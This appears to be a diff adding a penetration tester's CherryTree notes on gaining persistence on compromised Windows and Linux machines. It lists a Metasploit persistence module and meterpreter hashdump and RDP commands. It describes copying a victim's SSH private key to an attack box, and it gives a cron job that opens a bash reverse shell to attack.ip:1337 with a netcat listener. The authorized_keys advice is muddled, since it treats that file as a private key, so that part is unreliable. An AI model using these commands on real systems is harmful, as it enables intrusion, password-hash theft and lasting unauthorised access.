@@ -1,0 +1,49 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node name="Persistence" unique_id="15" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1704140785" ts_lastsave="1704141104">
+    <rich_text underline="single" weight="heavy">windows</rich_text>
+    <rich_text>
+
+
+
+</rich_text>
+    <rich_text underline="single" weight="heavy">linux</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text underline="single" weight="heavy">SSH</rich_text>
+    <rich_text>
+
+
+</rich_text>
+    <rich_text underline="single" weight="heavy">SSH Authorized_Keys</rich_text>
+    <rich_text>
+When a device has been compromised, check the user's home folders for authorized keys. This can allow you to privesc without needing a password
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text underline="single" weight="heavy">Cron</rich_text>
+    <rich_text>
+</rich_text>
+    <codebox char_offset="9" justification="left" frame_width="1717" frame_height="70" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">exploit/windows/local/persistence_service #This Module will generate and upload an executable to a remote host, next will make it a persistent service. Admin is required.
+hashdump #meterpreter
+getgui #meterpreter, enables RDP</codebox>
+    <codebox char_offset="22" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">~/.ssh/id_rsa #copy this to the attacker machine
+#from attack box
+chmod 400 id_rsa
+ssh -i id_rsa user@victim.ip</codebox>
+    <codebox char_offset="189" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">cat /home/user/.ssh/authorized_keys
+#from attack box
+ssh -i authorized_keys user@ip.addr</codebox>
+    <codebox char_offset="197" justification="left" frame_width="798" frame_height="40" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">cat /etc/cron* #view all cronjobs
+
+#to persist through cron
+echo "* * * * * /bin/bash -c 'bash -i &gt;&amp; /dev/tcp/attack.ip/1337 0&gt;&amp;1'" &gt; cron
+crontab -i cron
+crontab -l
+
+#from attack box
+nc -nvlp 1337</codebox>
+  </node>
+</cherrytree>
